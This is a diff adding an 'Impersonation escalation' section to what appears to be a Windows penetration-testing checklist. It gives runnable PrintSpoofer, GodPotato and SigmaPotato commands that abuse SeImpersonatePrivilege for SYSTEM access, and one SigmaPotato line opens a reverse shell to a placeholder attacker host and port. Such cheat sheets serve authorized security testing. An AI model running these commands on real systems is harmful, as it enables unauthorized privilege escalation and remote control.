@@ -20,6 +20,18 @@ whoami /all
 
 Record current identity, groups and token privileges. A listed privilege alone does not prove an available escalation. [Microsoft whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami).
 
+## Impersonation escalation
+
+When `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled, the potato family usually escalates. Upload the chosen binary with an Evil-WinRM session, then run it on the target:
+
+```powershell
+.\PrintSpoofer64.exe -i -c powershell.exe
+.\GodPotato.exe -cmd "cmd.exe"
+.\SigmaPotato.exe --revshell {{LHOST}} {{LPORT}}
+```
+
+Match the binary to the target architecture and build; one failure does not rule out the others. Verify the result reports `nt authority\system`. [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), [GodPotato](https://github.com/BeichenDream/GodPotato), [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato).
+
 ## Automated enumeration
 
 - [ ] Choose the x64 binary only for an x64 target with a compatible .NET runtime.
